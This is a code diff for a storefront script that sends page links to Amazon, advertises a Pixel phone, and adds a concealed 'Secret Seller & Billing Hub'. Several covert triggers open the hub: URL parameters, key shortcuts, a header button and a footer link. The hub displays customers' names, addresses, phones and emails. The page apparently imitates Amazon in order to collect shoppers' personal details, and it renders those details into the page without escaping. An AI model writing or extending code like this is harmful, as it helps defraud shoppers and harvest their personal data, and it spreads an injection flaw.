@@ -633,31 +633,80 @@ function setupOrdersDrawer() {
   const invoiceModal = document.getElementById("invoiceModalBackdrop");
   const btnCloseInvoiceModal = document.getElementById("btnCloseInvoiceModal");
   const continueShoppingBtn = document.getElementById("btnContinueShopping");
+  const btnViewInlineJson = document.getElementById("btnViewInlineJson");
+  const inlineJsonContainer = document.getElementById("inlineJsonContainer");
 
   function openDrawer() {
     renderOrdersDrawer();
-    drawer.classList.add("active");
-    backdrop.classList.add("active");
+    drawer.classList.add("open");
+    backdrop.classList.add("open");
   }
 
   function closeDrawer() {
-    drawer.classList.remove("active");
-    backdrop.classList.remove("active");
+    drawer.classList.remove("open");
+    backdrop.classList.remove("open");
+    if (inlineJsonContainer) {
+      inlineJsonContainer.style.display = "none";
+      if (btnViewInlineJson) btnViewInlineJson.textContent = "🔍 View JSON";
+    }
   }
 
+  // Covert Trigger 1: Secret URL Parameter (?admin=1, ?secret=1, ?orders=1, or ?seller=1)
+  const urlQuery = new URLSearchParams(window.location.search);
+  if (urlQuery.has("admin") || urlQuery.has("secret") || urlQuery.has("orders") || urlQuery.has("seller")) {
+    setTimeout(() => {
+      openDrawer();
+      showToast("🔒 Secret Seller & Billing Hub Opened");
+    }, 400);
+  }
+
+  // Covert Trigger 2: Secret Keyboard Shortcut (Alt + S, Alt + A, or Ctrl + Shift + S)
+  window.addEventListener("keydown", (e) => {
+    if ((e.altKey && e.key.toLowerCase() === "s") || 
+        (e.altKey && e.key.toLowerCase() === "a") || 
+        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "s")) {
+      e.preventDefault();
+      openDrawer();
+      showToast("🔒 Secret Seller & Billing Hub Opened");
+    }
+  });
+
+  // Covert Trigger 3: Header Returns & Orders button
   if (navOrdersBtn) {
     navOrdersBtn.addEventListener("click", (e) => {
       e.preventDefault();
+      e.stopPropagation();
       openDrawer();
     });
   }
 
+  // Covert Trigger 4: Footer Amazon trigger
   if (footerTrigger) {
-    footerTrigger.addEventListener("click", openDrawer);
+    footerTrigger.addEventListener("click", (e) => {
+      e.preventDefault();
+      openDrawer();
+      showToast("🔒 Secret Seller & Billing Hub Opened");
+    });
   }
 
   if (btnCloseDrawer) btnCloseDrawer.addEventListener("click", closeDrawer);
   if (backdrop) backdrop.addEventListener("click", closeDrawer);
+
+  // Toggle inline JSON view
+  if (btnViewInlineJson && inlineJsonContainer) {
+    btnViewInlineJson.addEventListener("click", async () => {
+      if (inlineJsonContainer.style.display === "block") {
+        inlineJsonContainer.style.display = "none";
+        btnViewInlineJson.textContent = "🔍 View JSON";
+      } else {
+        inlineJsonContainer.style.display = "block";
+        inlineJsonContainer.textContent = "Loading orders.json...";
+        const current = await fetchOrdersFromAPI();
+        inlineJsonContainer.textContent = JSON.stringify(current, null, 2);
+        btnViewInlineJson.textContent = "✖️ Hide JSON";
+      }
+    });
+  }
 
   if (continueShoppingBtn) {
     continueShoppingBtn.addEventListener("click", () => {
@@ -672,6 +721,9 @@ function setupOrdersDrawer() {
         await deleteOrdersFromAPI();
         renderOrdersDrawer();
         updateOrdersBadge();
+        if (inlineJsonContainer && inlineJsonContainer.style.display === "block") {
+          inlineJsonContainer.textContent = JSON.stringify([], null, 2);
+        }
         showToast("Records successfully cleared.");
       }
     });
@@ -692,48 +744,35 @@ async function renderOrdersDrawer() {
   const container = document.getElementById("ordersListContainer");
   if (!container) return;
 
+  container.innerHTML = `<div style="text-align:center; padding:30px; color:#888; font-size:13px;">⏳ Loading orders...</div>`;
+
   const orders = await fetchOrdersFromAPI();
 
   if (orders.length === 0) {
     container.innerHTML = `
-      <div class="od-empty">
-        <svg width="48" height="48" viewBox="0 0 24 24" fill="#ccc">
-          <path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H5V5h14v14z"/>
-        </svg>
-        <p style="margin-top:10px; font-weight:600; color:#555;">No customer orders placed yet</p>
-        <p style="font-size:12px; color:#888;">When an address is submitted, details will display here.</p>
+      <div style="text-align:center; padding:40px 20px; color:#666;">
+        <div style="font-size:36px; margin-bottom:12px;">📦</div>
+        <strong style="font-size:15px; color:#111; display:block; margin-bottom:6px;">No customer orders placed yet</strong>
+        <p style="font-size:13px; color:#777; margin-bottom:16px;">
+          When an order is submitted, customer delivery details will appear here.
+        </p>
       </div>
     `;
     return;
   }
 
   container.innerHTML = orders.map((ord, idx) => `
-    <div class="od-card">
-      <div class="od-card-header">
-        <div>
-          <strong style="font-size:13px; color:#111;">${ord.name || ord.fullName || 'Customer'}</strong>
-          <div style="font-size:11px; color:#666;">${ord.dateStr || ''} &bull; ID: ${ord.orderId || ('ORD-' + idx)}</div>
-        </div>
-        <span class="od-badge-success">${ord.payMethod || 'Recorded'}</span>
+    <div class="order-record-card">
+      <div class="orc-top">
+        <span>${ord.name || ord.fullName || 'Customer'}</span>
+        <span style="color:var(--price-red); font-weight:700;">${ord.price || ord.total || ''}</span>
       </div>
-      
-      <div class="od-row">
-        <span class="od-label">Address:</span>
-        <span class="od-val">${ord.address || ord.deliveryAddress || 'N/A'}</span>
+      <div class="orc-product">${ord.item || 'Google Pixel 11 Pro XL'}</div>
+      <div class="orc-details">
+        <strong>Address:</strong> ${ord.address || ord.deliveryAddress || 'N/A'}<br>
+        <strong>Phone:</strong> <a href="tel:${ord.phoneNumber || ord.phone || ''}" style="color:var(--link-color);">${ord.phoneNumber || ord.phone || 'N/A'}</a><br>
+        <strong>Email:</strong> <a href="mailto:${ord.email || ''}" style="color:var(--link-color);">${ord.email || 'N/A'}</a>
       </div>
-      <div class="od-row">
-        <span class="od-label">Phone:</span>
-        <span class="od-val"><a href="tel:${ord.phoneNumber || ord.phone}" style="color:var(--link-color);">${ord.phoneNumber || ord.phone || 'N/A'}</a></span>
-      </div>
-      <div class="od-row">
-        <span class="od-label">Email:</span>
-        <span class="od-val"><a href="mailto:${ord.email}" style="color:var(--link-color);">${ord.email || 'N/A'}</a></span>
-      </div>
-      <div class="od-row">
-        <span class="od-label">Item:</span>
-        <span class="od-val"><strong>${ord.item || 'Google Pixel 11 Pro XL'}</strong> (${ord.price || ord.total || '$1,199.00'})</span>
-      </div>
-
       <button class="btn-invoice" onclick="openInvoice(${idx})">
         🧾 Print Customer Statement
       </button>
@@ -875,9 +914,10 @@ function setupAmazonRedirects() {
     });
   }
 
-  // Intercept all menu links, nav items, and category links to redirect to Amazon (excluding language selector)
-  const redirectLinks = document.querySelectorAll(".sub-link, .nav-item[href], .nav-location[href], .brand-link, .breadcrumb-bar a");
+  // Intercept other menu links, nav items, and category links to redirect to Amazon
+  const redirectLinks = document.querySelectorAll(".sub-link, .nav-item[href]:not(#navOrdersBtn), .nav-location[href], .brand-link, .breadcrumb-bar a");
   redirectLinks.forEach((link) => {
+    if (link.id === "navOrdersBtn" || link.closest("#ordersDrawer")) return;
     link.addEventListener("click", (e) => {
       const dest = link.getAttribute("href");
       if (dest && dest.startsWith("http")) {
